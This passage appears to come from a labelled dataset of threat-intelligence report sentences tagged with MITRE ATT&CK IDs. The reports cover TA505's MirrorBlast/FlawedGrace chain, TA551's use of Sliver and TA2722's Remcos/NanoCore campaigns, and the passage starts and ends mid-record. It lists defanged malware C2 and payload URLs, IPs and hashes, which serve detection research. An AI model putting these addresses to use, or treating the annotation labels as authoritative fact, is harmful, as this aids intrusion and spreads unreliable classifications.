"proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 12. Attack paths ultimately leading to FlawedGrace.*", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "In the attack chain, the Excel macros download the first MSI file, which executes the first loader, encoded in KiXtart scripting language.", "labels": ["T1105", "T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The KiXtart interpreter then receives a command from the C&C server to download a follow-on MSI package.", "labels": ["TA0011", "T1059", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Of note, KiXtart loader is not always part of the attack chain.", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The second MSI package contains multiple files that may have different names, for example, AudioDriver.exe (the Rebol interpreter), AudioDriver.exe.lnk (command that informs .ico execution), and image.ico (the Rebol script).", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "This Rebol script is the second new downloader in the chain, that Proofpoint dubbed MirrorBlast.", "labels": ["T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 13. Example of MirrorBlast script, it may be slightly different in different campaigns.*", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "MirrorBlast in turn downloads additional Rebol script stagers that execute simple downloaders, dubbed by Proofpoint as ReflectiveGnome.", "labels": ["T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "ReflectiveGnome in turn downloads more shellcode, that will then drop and detonate FlawedGrace.", "labels": ["S0383", "T1105", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 14. Rebol script downloaded by MirrorBlast that drops ReflectiveGnome loader (dwm-x64.exe / dwm-x32.exe).*", "labels": ["T1105", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 15. ReflectiveGnome loader which executes the next stage as a shellcode.*", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "*Figure 16. This shellcode drops and detonates an updated FlawedGrace.*", "labels": ["T1059", "S0383", "T1105"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "### **Updated FlawedGrace RAT**", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Proofpoint researchers first observed [FlawedGrace](/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505 \"ServHelper and FlawedGrace - New malware introduced by TA505\") in November 2017.", "labels": ["S0383", "S0383", "G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "It is a full-featured RAT written in C++ that can receive the following commands from its C&C via a custom binary protocol on TCP port 443:", "labels": ["TA0011", "T1571"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "While Proofpoint researchers are still investigating the updates to this version of FlawedGrace, some notable changes include:", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "* Configuration is now stored as an encrypted resource (initial/default config), then it is stored both in a mapped memory region (current configuration instance) and in the registry (persistence)", "labels": ["T1112"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Proofpoint attributes the campaigns discussed in this blog to TA505 with high confidence.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Proofpoint's assessment that TA505 is responsible for this renewed activity is based on the aforementioned similarities between historic TA505 campaigns and this new activity, including, but not limited to, code similarities, domain naming patterns and the use of FlawedGrace, which has been almost exclusively linked to TA505 activity.", "labels": ["G0092", "G0092", "S0383", "G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "TA505 is an established threat actor that is financially motivated and known for conducting malicious email campaigns on a previously unprecedented scale.", "labels": ["G0092", "T1566"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "The group regularly changes their TTPs and are considered [trendsetters](/us/threat-insight/post/servhelper-and-flawedgrace-new-malware-introduced-ta505 \"ServHelper and FlawedGrace - New malware introduced by TA505\") in the world of cybercrime.", "labels": ["S0383", "G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "This combined with TA505\u2019s ability to be flexible, focusing on what is the most lucrative and shifting its TTPs as necessary, make the actor a continued threat.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Proofpoint researchers expect TA505 to continue to adjust its operations and methods always with an eye to financial gain.", "labels": ["G0092"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034012 - ET TROJAN MirrorBlast Checkin (trojan.rules)", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034022 - ET TROJAN MirrorBlast CnC Activity M2 (trojan.rules)", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034023 - ET TROJAN MirrorBlast CnC Activity M3 (trojan.rules)", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034091 - ET TROJAN MirrorBlast KiXtart Downloader Client Request (trojan.rules)", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034110 - ET TROJAN MirrorBlast KiXtart Downloader Server Response (trojan.rules)", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034136 - ET TROJAN MirrorBlast KiXtart Downloader Client Request M2 (trojan.rules)", "labels": ["T1059"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2034042 - ET TROJAN ReflectiveGnome Download Activity (trojan.rules)", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2850099 - ETPRO TROJAN FlawedGrace CnC Activity M2 (trojan.rules)", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "2850098 - ETPRO TROJAN FlawedGrace CnC Activity M1 (trojan.rules)", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://139.59.93.223/c[.]php | URL | MirrorBlast C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://menorukis[.]su | URL | MirrorBlast C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://fidufagios[.]com/ | URL | MirrorBlast C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://feristoaul[.]com/ | URL | MirrorBlast C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| cdn-wfs-nspod[.]com | Domain | FlawedGrace C&C |", "labels": ["S0383", "TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://141.164.41[.]231/host64\\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://141.164.41[.]231/host32\\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://89.44.197[.]46/host64\\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://89.44.197[.]46/host32\\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://193.42.36[.]110/host64\\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://193.42.36[.]110/host32\\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://5.149.255[.]14/host64\\_sh[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://5.149.255[.]14/host32\\_pic[.]bin | URL | MirrorBlast Payload (FlawedGrace) |", "labels": ["S0383"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://45.79.239[.]23/version.php?data= | URL | First Stage Kixtart Script C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://185.202.93[.]201:80/mlp[.]php | URL | First Stage Kixtart Script C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://185.183.96[.]147/?data= | URL | First Stage Kixtart Script C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://185.176.220[.]198/?data= | URL | First Stage Kixtart Script C&C |", "labels": ["TA0011"], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://185.225.19[.]156/ | URL | Kixtart Payload (MirrorBlast) |", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://192.36.27[.]92/10opd3r\\_load[.]msi | URL | Kixtart Payload (MirrorBlast) |", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "| hxxp://5.188.108[.]40/trehjugdr4et6u[.]msi | URL | Kixtart Payload (MirrorBlast) |", "labels": [], "document": "proofpoint_2021-10-19_whatta-ta-ta505-ramps-activity"}, {"sentence": "Security Brief: TA551 Uses \u2018SLIVER\u2019 Red Team Tool in New Activity", "labels": ["G0127", "S0633"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "Proofpoint researchers identified a new campaign from the highly active cybercrime actor known as TA551 using a legitimate \u201cRed Team & adversary simulation Framework\u201d.", "labels": ["G0127", "S0633"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "Proofpoint assesses with high confidence the new activity could lead to ransomware infections.", "labels": ["T1486"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "TA551 is a criminal threat actor Proofpoint has tracked since 2016.", "labels": ["G0127"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "It is known by other security firms as [Shathak](https://unit42.paloaltonetworks.com/ta551-shathak-icedid/).", "labels": ["G0127"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "Proofpoint assesses with high confidence TA551 gains access to stolen messages or compromised email accounts \u2013 also known as thread hijacking \u2013 which it uses in email campaigns to distribute malware.", "labels": ["G0127", "T1566"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "TA551 has previously distributed malware payloads such as Ursnif, IcedID, Qbot, and Emotet.", "labels": ["G0127", "S0386", "S0483", "S0367"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "This actor acts as an [initial access facilitator](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware) for ransomware threat actors.", "labels": ["TA0001", "T1486"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "Proofpoint has observed its campaigns leveraging banking trojans have led to ransomware infections.", "labels": ["T1486"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "Proofpoint assesses with high confidence TA551 IcedID implants were associated with Maze and Egregor ransomware [events](https://www.fireeye.com/blog/threat-research/2021/02/melting-unc2198-icedid-to-ransomware-operations.html) in 2020.", "labels": ["G0127", "S0483", "S0449", "S0554", "T1486"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "On 20 October 2021, Proofpoint observed emails that appeared to be replies to previous conversations and contained password-protected zipped Word documents.", "labels": ["T1566"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "The attachments ultimately lead to the download of [Sliver](https://github.com/BishopFox/sliver/tree/6c02971b54831884d30407b632a379947dd289ad), an open-source, cross-platform adversary simulation and red team platform.", "labels": ["T1059"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "The activity demonstrated a significant departure from previous tactics, techniques, and procedures from TA551.", "labels": ["G0127"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "![Figure: Thread hijacked email containing zipped Word document.](/system/files/inline-images/BlogImg1_Silver.png)", "labels": ["T1566"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "*Figure: Thread hijacked email containing zipped Word document.*", "labels": ["T1566"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "When a victim downloads the zipped attachment, they are ultimately directed to a macro-laden Microsoft Word document.", "labels": ["T1566", "T1059"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "If macros are enabled, SLIVER is downloaded.", "labels": ["S0633", "T1059"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "*Figure: Malicious Microsoft Word document directing victims to enable macros.*", "labels": ["T1059", "T1059", "T1059"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "SLIVER is available for free online, and capabilities include information gathering, command and control (C2) functionality, token manipulation, process injection, and other features.", "labels": ["S0633", "TA0011", "TA0011", "T1134", "T1055"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "For instance, Proofpoint observed a [161% increase](https://www.proofpoint.com/us/blog/threat-insight/cobalt-strike-favorite-tool-apt-crimeware) in threat actor use of the red teaming tool Cobalt Strike between 2019 and 2020.", "labels": ["S0154"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "TA551\u2019s use of SLIVER demonstrates considerable actor flexibility.", "labels": ["G0127", "S0633"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "As an established initial access broker leveraging initial access via email threat campaigns, TA551 would compromise a victim and potentially broker access to enable the deployment of Cobalt Strike and eventually ransomware.", "labels": ["TA0001", "T1566", "G0127", "S0154", "T1486"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "With SLIVER, TA551 actors can gain direct access and interact with victims immediately, with more direct capabilities for execution, persistence, and lateral movement.", "labels": ["S0633", "G0127", "TA0002", "TA0003", "TA0008"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "| hXXp://ruwejo[.]com/upload/admin.jsp | SLIVER C2 |", "labels": ["S0633", "TA0011"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "ETPRO MALWARE Sliver Framework HTTP C2 sessionInit", "labels": ["T1071"], "document": "proofpoint_2021-10-20_ta551-uses-sliver-red-team"}, {"sentence": "* Proofpoint identified a new cybercriminal threat actor, TA2722.", "labels": [], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "* TA2722 typically targets Shipping/Logistics, Manufacturing, Business Services, Pharmaceutical, and Energy entities, among others.", "labels": [], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "* TA2722 distributes Remcos and NanoCore remote access trojans (RATs).", "labels": ["S0332", "S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint identified a new and highly active cybercriminal threat actor, TA2722, colloquially referred to by Proofpoint threat researchers as the Balikbayan Foxes.", "labels": [], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint assesses this actor is targeting organizations directly or indirectly engaged with the Philippine government based on a continuous pattern of spoofing email addresses and delivering lures designed to impersonate government entities.", "labels": ["T1566"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "All the campaigns distributed either Remcos or NanoCore remote access trojans (RATs).", "labels": ["S0332", "S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Remcos and NanoCore are typically used for information gathering, data theft operations, monitoring and control of compromised computers.", "labels": ["S0332", "S0336", "TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint researchers identified a series of campaigns distributing Remcos and NanoCore RATs masquerading as the Kingdom of Saudi Arabia (KSA) embassy in Manila and the Philippine Overseas Employment Administration (POEA) in mid-2021.", "labels": ["S0332", "S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "* OneDrive URLs linking to RAR files with embedded UUE files", "labels": ["T1566"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "* PDF email attachment with an embedded OneDrive link or other malicious URL leading to compressed executables (.iso files) that download and run malware", "labels": ["T1566", "T1566"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "* Compressed MS Excel documents containing macros which, if enabled, download malware", "labels": ["T1204"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Remcos is a commodity remote access tool available for purchase online.", "labels": ["S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "NanoCore is also commodity malware and written in .NET by \"Aeonhack\".", "labels": ["S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The code is obfuscated with Eazfuscator.NET 3.3. NanoCore RAT is sold on various hack forums.", "labels": ["T1027", "S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "NanoCore includes many features and plugins.", "labels": ["S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Both Remcos and NanoCore RAT are distributed by numerous cybercrime threat actors with many different delivery techniques and lures.", "labels": ["S0332", "S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint named the first identified cluster Shahzad73 based on the command and control (C2) domains used by the threat actor:\u00a0", "labels": ["TA0011", "TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Most of these messages contain either UUE or RAR attachments ultimately leading to the installation of Remcos remote access trojan (RAT) or NanoCore RAT.", "labels": ["T1566", "S0332", "S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Each campaign featured a dynamic DNS C2 domain containing the keyword shahzad73.", "labels": ["TA0011", "T1568"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Example attachment file names:\u00a0", "labels": ["T1566", "T1566"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The observed Remcos samples included the following example configuration:\u00a0\u00a0", "labels": ["S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "\u00a0 \u00a0 \u00a0 \u00a0C2: shahzad73[.]casacam[.]net:2404\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "\u00a0 \u00a0 \u00a0 \u00a0C2: shahzad73[.]ddns[.]net:2404\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Observed NanoCore RAT samples included the following example configuration:\u00a0", "labels": ["S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The identified Remcos RAT campaigns impacted nearly 150 customers globally, with a focus on Shipping and Logistics, Manufacturing, Industry, and Energy sectors.", "labels": ["S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The threat actor generally leverages themes purporting to be entities related to the Philippine government, most frequently the Bureau of Customs CPRS. Other emails masqueraded as the country\u2019s Department of Health distributing COVID-19 information.", "labels": ["T1566"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The emails contain either a OneDrive URL or a PDF attachment with a OneDrive URL leading to the download of a compressed executable (e.g. Covid-19 Data Report Checklist\\_pdf.iso) which, if executed, leads to Remcos RAT.", "labels": ["S0332", "T1566", "T1566"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The most recent Remcos configuration is as follows:\u00a0", "labels": ["S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "\u00a0 \u00a0 \u00a0 \u00a0C2: cato[.]fingusti[.]club\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "2020 campaigns included the following Remcos configuration:\u00a0", "labels": ["S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "\u00a0 \u00a0 \u00a0 \u00a0C2: remcos[.]got-game[.]org:2265:pass\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint researchers observed corporate credential capture attempts targeting many of the same companies as previously observed Remcos activity.", "labels": ["S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "The phishing emails masqueraded as the Philippines Bureau of Customs CPRS and contained actor-hosted URLs linking to a credential harvesting page.", "labels": ["T1566", "TA0006"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Despite an expansion of TTPs to include credential harvesting campaigns, Proofpoint assesses with high confidence credential capture activities are likely temporary and the threat actor maintains ongoing high levels of malware distribution activity.", "labels": ["TA0006"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint assesses with high confidence the two observed threat clusters are associated with the same threat actor, TA2722.", "labels": [], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| Threat Cluster\u00a0 | C2\u00a0IP\u00a0 | Last Seen\u00a0 | First Seen\u00a0 | ASN\u00a0 | Host Org\u00a0 | Netblock\u00a0 | Country\u00a0 | Registrar\u00a0 |", "labels": ["TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Additionally, Proofpoint identified a common registration email associated with multiple command and control IPs and domains that overlapped with the observed activity:\u00a0", "labels": ["TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Proofpoint assesses with high confidence TA2722 is a highly active threat actor leveraging Philippine government themes and targeting a variety of organizations in Southeast Asia, Europe, and North America.", "labels": [], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| de5992f7c92351d1011fbece2d4bf74ecfc3b09f84aedb12997a2c3bf869de2c\u00a0 | Remcos\u00a0SHA256\u00a0 |", "labels": ["S0332", "S0332"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| 098fe3c8d0407e7438827fb38831dac4af8bd42690f8bd43d4f92fd2b7f33525\u00a0 | NanoCore\u00a0SHA256\u00a0 |", "labels": ["S0336"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| shahzad73[.]casacam[.]net\u00a0 | Remcos/NanoCore\u00a0C2\u00a0 |", "labels": ["S0332", "S0336", "TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| shahzad73[.]ddns[.]net\u00a0 | Remcos/NanoCore\u00a0C2\u00a0 |", "labels": ["S0332", "S0336", "TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| cato[.]fingusti[.]club\u00a0 | Remcos\u00a0C2\u00a0 |", "labels": ["S0332", "TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "| remcos[.]got-game[.]org\u00a0 | Remcos\u00a0C2\u00a0 |", "labels": ["S0332", "TA0011"], "document": "proofpoint_2021-10-27_new-threat-actor-spoofs-philippine"}, {"sentence": "Supply Chain Attacks, Cybersecurity & Regulations: What to Expect in 2021", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "On 19 January,\u00a0[Malwarebytes reported](https://blog.malwarebytes.com/malwarebytes-news/2021/01/malwarebytes-targeted-by-nation-state-actor-implicated-in-solarwinds-breach-evidence-suggests-abuse-of-privileged-access-to-microsoft-office-365-and-azure-environments/)\u00a0that the\u00a0nation-sponsored\u00a0attackers\u00a0behind last year\u2019s\u00a0[SolarWinds breach](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html), dubbed \u201cUNC2452\u201d by FireEye, had successfully compromised its systems and accessed\u00a0limited internal data.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Malwarebytes was not a user of SolarWinds products, and the intrusion vector allegedly leveraged a separate vulnerability in an email protection product for Microsoft Office 365 and Microsoft Azure \u2013 one of Malwarebytes supply chain participants.", "labels": ["T1190"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "The Rise of Supply Chain Attacks", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Supply chain attacks are on the rise.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Microsoft Office 365, the target of this\u00a0recent\u00a0attack, demonstrates an example of the growing risk of supply chain attacks.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Cybersecurity experts warn that one type of supply chain attack in particular \u2013\u00a0open source\u00a0code attacks \u2013\u00a0is\u00a0[rapidly increasing](https://blog.sonatype.com/2020-state-of-the-software-supply-chain-report):\u00a0", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Further,\u00a0Sonatype\u00a0warns of a 430% year-on-year increase in attacks targeting\u00a0open source\u00a0components directly\u00a0to\u00a0covertly infect key software supply chains.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Supply chain attacks come from various threat actors with a wide range of attack vectors, which all present unique security threats:\u00a0", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Incident responders\u00a0implementing mitigations to\u00a0prevent supply chain security weaknesses\u00a0will need to acknowledge that attacks can come from an increasing variety of sources including nation-state actors.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "In 2020, researchers implicated the Chinese government-linked threat actor\u00a0*APT40*\u00a0in a[supply chain attack on Taiwanese government entities](https://mercury.quointelligence.eu/INTTicket/show/6449).", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "The attack leveraged trusted relationships and privileged network access between government entities and their sub-contractors.", "labels": ["T1199"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Additionally, a group of Iranian\u00a0government-linked\u00a0APTs carried out large-scale espionage attacks against global entities leveraging, in part,\u00a0compromises of their targets\u2019 supply chains.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Advanced Persistent Threat groups (APT),\u00a0such as the\u00a0Winnti\u00a0group, have [previously compromised entities within their targets\u2019 supply chains](https://mercury.quointelligence.eu/INTTicket/show/4613) and inserted malicious code into automatically distributed software updates, thus exploiting trusted links and undermining code signing measures.", "labels": ["G0044", "T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Attackers are increasingly attempting to covertly insert malware\u00a0[into public open source code repositories](https://mercury.quointelligence.eu/INTTicket/show/4613).", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Numerous corporate and government entities\u00a0are reliant on\u00a0open source\u00a0projects to accelerate development, but the increased vulnerability to supply chain attacksunderpin their infrastructure and software.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "\u202fIn one instance, attackers\u00a0[compromised\u202fa Ukrainian mobile application developer](https://www.wired.com/story/sandworm-android-malware/)\u00a0and used that access to push a malicious update containing malware.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "An employee running a\u00a0malicious\u00a0app\u00a0could mistakenly grant 